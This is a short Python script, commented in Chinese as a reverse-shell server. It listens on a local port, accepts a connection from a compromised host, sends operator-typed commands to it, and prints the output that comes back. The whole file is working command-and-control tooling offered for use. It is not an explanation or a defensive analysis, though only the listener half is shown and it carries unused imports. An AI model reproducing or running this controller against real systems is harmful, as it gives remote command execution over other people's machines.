import socket
import time
import pymysql
import threading

#反弹shell服务端

def thread_send():
    while True:
        print("send等待连接,1000秒后超时")
        conn,addr = s.accept()
        while True:
            try:
                user_input = input('>>> ').strip()
                if user_input!="": #输入不为空
                    conn.send(user_input.encode('utf-8')) #编码发送
                    
                    cmd=conn.recv(4096).decode() #解码接受
                    print(cmd) #输出命令
       
                elif user_input=="":
                    print("命令不能空")
            except:
                print("服务器异常")
                
    s.close()

if __name__ == '__main__':
    HostPort = ('127.0.0.1',8888)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(HostPort)
    s.listen(5)
    s.settimeout(1000) #设置超时时间1000秒
    thread_send()
